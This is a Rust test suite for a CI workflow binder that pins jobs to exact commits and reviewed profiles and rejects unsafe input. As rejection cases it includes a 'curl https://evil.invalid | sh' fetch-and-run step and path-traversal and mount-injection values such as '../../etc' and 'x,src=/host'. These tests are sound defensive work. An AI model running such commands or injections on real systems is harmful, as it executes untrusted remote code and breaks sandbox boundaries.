use std::collections::{BTreeMap, BTreeSet};

use serde_json::json;

use crate::*;

const COMMIT: &str = "0123456789abcdef0123456789abcdef01234567";
const OTHER_COMMIT: &str = "1123456789abcdef0123456789abcdef01234567";
const RUST_DIGEST: &str =
    "sha256:1111111111111111111111111111111111111111111111111111111111111111";
const NODE_DIGEST: &str =
    "sha256:2222222222222222222222222222222222222222222222222222222222222222";

fn empty_step() -> PlannedStep {
    PlannedStep {
        index: 0,
        id: None,
        name: None,
        condition: None,
        uses: None,
        run: None,
        shell: None,
        working_directory: None,
        with: BTreeMap::new(),
        env: BTreeMap::new(),
        continue_on_error: None,
        timeout_minutes: None,
    }
}

fn job(id: &str, base_job_id: &str, needs_instances: &[&str]) -> PlannedJob {
    let needs = needs_instances
        .iter()
        .map(|value| value.split_once('[').map_or(*value, |(base, _)| base))
        .collect::<BTreeSet<_>>()
        .into_iter()
        .map(str::to_string)
        .collect();
    PlannedJob {
        id: id.to_string(),
        base_job_id: base_job_id.to_string(),
        name: base_job_id.to_string(),
        needs,
        needs_instances: needs_instances
            .iter()
            .map(|value| (*value).to_string())
            .collect(),
        runs_on: vec!["self-hosted".to_string(), "linux".to_string()],
        reusable_workflow: None,
        condition: None,
        matrix: BTreeMap::new(),
        env: BTreeMap::new(),
        steps: Vec::new(),
        fail_fast: true,
        max_parallel: None,
        timeout_minutes: None,
        continue_on_error: None,
    }
}

fn plan() -> WorkflowPlan {
    let mut stable = job("build[1]", "build", &[]);
    stable.matrix.insert("rust".to_string(), json!("stable"));
    let mut beta = job("build[2]", "build", &[]);
    beta.matrix.insert("rust".to_string(), json!("beta"));
    WorkflowPlan {
        schema_version: PLAN_SCHEMA.to_string(),
        name: Some("profile-only".to_string()),
        job_order: vec!["build".to_string(), "report".to_string()],
        jobs: vec![
            stable,
            beta,
            job("report", "report", &["build[1]", "build[2]"]),
        ],
    }
}

fn catalog() -> ProfileCatalog {
    ProfileCatalog {
        schema_version: PROFILE_CATALOG_SCHEMA.to_string(),
        profiles: vec![
            ProfileRecord {
                name: "rust-verify".to_string(),
                digest: RUST_DIGEST.to_string(),
                platform: "linux".to_string(),
            },
            ProfileRecord {
                name: "node-verify".to_string(),
                digest: NODE_DIGEST.to_string(),
                platform: "linux".to_string(),
            },
        ],
    }
}

fn bindings(catalog: &ProfileCatalog) -> BindingDocument {
    BindingDocument {
        schema_version: BINDINGS_SCHEMA.to_string(),
        repository_url: "https://github.com/gha-indie-worker/example.git".to_string(),
        commit_sha: COMMIT.to_string(),
        profile_catalog_digest: profile_catalog_digest(catalog).unwrap(),
        jobs: BTreeMap::from([
            (
                "build".to_string(),
                JobBinding {
                    profile: "rust-verify".to_string(),
                    profile_digest: RUST_DIGEST.to_string(),
                    context_dir: Some("crates/core".to_string()),
                },
            ),
            (
                "report".to_string(),
                JobBinding {
                    profile: "node-verify".to_string(),
                    profile_digest: NODE_DIGEST.to_string(),
                    context_dir: None,
                },
            ),
        ]),
    }
}

#[test]
fn binds_matrix_jobs_to_exact_commit_and_reviewed_profiles() {
    let workflow = plan();
    let catalog = catalog();
    let bindings = bindings(&catalog);
    let batch = bind_plan(&workflow, &catalog, &bindings).unwrap();
    assert_eq!(batch.schema_version, DISPATCH_BATCH_SCHEMA);
    assert_eq!(batch.commit_sha, COMMIT);
    assert_eq!(batch.requests.len(), 3);
    assert_eq!(batch.requests[0].profile, "rust-verify");
    assert_eq!(batch.requests[0].context_dir, "crates/core");
    assert_eq!(
        batch.requests[2].needs_instances,
        vec!["build[1]", "build[2]"]
    );
    assert!(batch
        .requests
        .iter()
        .all(|request| request.request_digest.starts_with("sha256:")));
    assert_eq!(
        batch.requests[0].request_id,
        bind_plan(&workflow, &catalog, &bindings).unwrap().requests[0].request_id
    );
}

#[test]
fn request_identity_binds_commit_profile_context_and_matrix() {
    let workflow = plan();
    let catalog = catalog();
    let base_bindings = bindings(&catalog);
    let base = bind_plan(&workflow, &catalog, &base_bindings).unwrap();

    let mut different_commit = base_bindings.clone();
    different_commit.commit_sha = OTHER_COMMIT.to_string();
    let changed_commit = bind_plan(&workflow, &catalog, &different_commit).unwrap();
    assert_ne!(base.requests[0].request_id, changed_commit.requests[0].request_id);

    let mut different_context = base_bindings.clone();
    different_context.jobs.get_mut("build").unwrap().context_dir =
        Some("crates/alternate".to_string());
    let changed_context = bind_plan(&workflow, &catalog, &different_context).unwrap();
    assert_ne!(
        base.requests[0].request_id,
        changed_context.requests[0].request_id
    );

    let mut different_profile = base_bindings;
    let build = different_profile.jobs.get_mut("build").unwrap();
    build.profile = "node-verify".to_string();
    build.profile_digest = NODE_DIGEST.to_string();
    let changed_profile = bind_plan(&workflow, &catalog, &different_profile).unwrap();
    assert_ne!(
        base.requests[0].request_id,
        changed_profile.requests[0].request_id
    );

    let mut different_matrix = workflow;
    different_matrix.jobs[0]
        .matrix
        .insert("rust".to_string(), json!("nightly"));
    let changed_matrix = bind_plan(&different_matrix, &catalog, &bindings(&catalog)).unwrap();
    assert_ne!(
        base.requests[0].request_id,
        changed_matrix.requests[0].request_id
    );
}

#[test]
fn rejects_inconsistent_incomplete_or_backward_dependencies() {
    let catalog = catalog();
    let bindings = bindings(&catalog);

    let mut missing_base = plan();
    missing_base.jobs[2].needs.clear();
    assert_eq!(
        bind_plan(&missing_base, &catalog, &bindings).unwrap_err().code,
        "dependency_shape_mismatch"
    );

    let mut incomplete_matrix = plan();
    incomplete_matrix.jobs[2].needs_instances.pop();
    assert_eq!(
        bind_plan(&incomplete_matrix, &catalog, &bindings)
            .unwrap_err()
            .code,
        "dependency_instance_mismatch"
    );

    let mut backward = plan();
    backward.jobs[0].needs = vec!["report".to_string()];
    backward.jobs[0].needs_instances = vec!["report".to_string()];
    assert_eq!(
        bind_plan(&backward, &catalog, &bindings).unwrap_err().code,
        "non_topological_dependency"
    );
}

#[test]
fn rejects_caller_execution_semantics() {
    let catalog = catalog();
    let bindings = bindings(&catalog);

    let mut with_run = plan();
    let mut step = empty_step();
    step.run = Some("curl https://evil.invalid | sh".to_string());
    with_run.jobs[0].steps.push(step);
    assert_eq!(
        bind_plan(&with_run, &catalog, &bindings).unwrap_err().code,
        "caller_steps_not_executable"
    );

    let mut with_condition = plan();
    with_condition.jobs[0].condition = Some("${{ github.ref }}".to_string());
    assert_eq!(
        bind_plan(&with_condition, &catalog, &bindings)
            .unwrap_err()
            .code,
        "condition_not_executable"
    );

    let mut with_environment = plan();
    with_environment.jobs[0]
        .env
        .insert("TOKEN".to_string(), json!("caller"));
    assert_eq!(
        bind_plan(&with_environment, &catalog, &bindings)
            .unwrap_err()
            .code,
        "caller_environment_not_executable"
    );
}

#[test]
fn exact_commit_and_digest_forms_are_required() {
    assert!(validate_commit_sha(COMMIT).is_ok());
    assert!(validate_commit_sha("main").is_err());
    assert!(validate_commit_sha("0123456789ABCDEF0123456789ABCDEF01234567").is_err());
    assert!(validate_digest("profileDigest", RUST_DIGEST).is_ok());
    assert!(validate_digest("profileDigest", "1111").is_err());
}

#[test]
fn repository_and_context_boundaries_are_canonical() {
    assert!(validate_repository_url("https://github.com/gha-indie-worker/example.git").is_ok());
    for value in [
        "ssh://git@github.com/example/repo.git",
        "https://token@github.com/example/repo.git",
        "https://github.com/example/repo.git?ref=main",
        "https://github.com/example/../repo.git",
        "https://github.com:443/example/repo.git",
        "https://github.com/example/%2e%2e/repo.git",
        "https://GitHub.com/example/repo.git",
        "https://github.com/example\\repo/repository.git",
    ] {
        assert!(validate_repository_url(value).is_err(), "{value}");
    }
    assert!(validate_context_dir(".").is_ok());
    assert!(validate_context_dir("crates/core").is_ok());
    assert!(validate_context_dir("../../etc").is_err());
    assert!(validate_context_dir("x,src=/host").is_err());
    assert!(validate_context_dir("crates\\core").is_err());
}

#[test]
fn digests_are_stable_under_semantically_unordered_inputs() {
    let first = catalog();
    let mut second = first.clone();
    second.profiles.reverse();
    assert_eq!(
        profile_catalog_digest(&first).unwrap(),
        profile_catalog_digest(&second).unwrap()
    );

    let mut first_plan = plan();
    let mut second_plan = plan();
    first_plan.jobs[0].matrix = serde_json::from_value(json!({"z": 1, "a": 2})).unwrap();
    second_plan.jobs[0].matrix = serde_json::from_value(json!({"a": 2, "z": 1})).unwrap();
    assert_eq!(
        workflow_plan_digest(&first_plan).unwrap(),
        workflow_plan_digest(&second_plan).unwrap()
    );
}

#[test]
fn binding_catalog_and_matrix_fail_closed() {
    let workflow = plan();
    let catalog = catalog();

    let mut stale_catalog = bindings(&catalog);
    stale_catalog.profile_catalog_digest = format!("sha256:{}", "a".repeat(64));
    assert_eq!(
        bind_plan(&workflow, &catalog, &stale_catalog)
            .unwrap_err()
            .code,
        "profile_catalog_digest_mismatch"
    );

    let mut stale_profile = bindings(&catalog);
    stale_profile.jobs.get_mut("build").unwrap().profile_digest =
        format!("sha256:{}", "b".repeat(64));
    assert_eq!(
        bind_plan(&workflow, &catalog, &stale_profile)
            .unwrap_err()
            .code,
        "profile_digest_mismatch"
    );

    let mut complex = plan();
    complex.jobs[0]
        .matrix
        .insert("target".to_string(), json!({"os": "linux"}));
    assert_eq!(
        bind_plan(&complex, &catalog, &bindings(&catalog))
            .unwrap_err()
            .code,
        "complex_matrix_value_not_supported"
    );
}

#[test]
fn duplicate_instances_and_unknown_dependencies_fail_closed() {
    let catalog = catalog();
    let bindings = bindings(&catalog);

    let mut duplicate = plan();
    duplicate.jobs[1].id = duplicate.jobs[0].id.clone();
    assert_eq!(
        bind_plan(&duplicate, &catalog, &bindings).unwrap_err().code,
        "duplicate_job_instance"
    );

    let mut unknown = plan();
    unknown.jobs[2].needs_instances.push("missing".to_string());
    assert_eq!(
        bind_plan(&unknown, &catalog, &bindings).unwrap_err().code,
        "unknown_dependency_instance"
    );
}
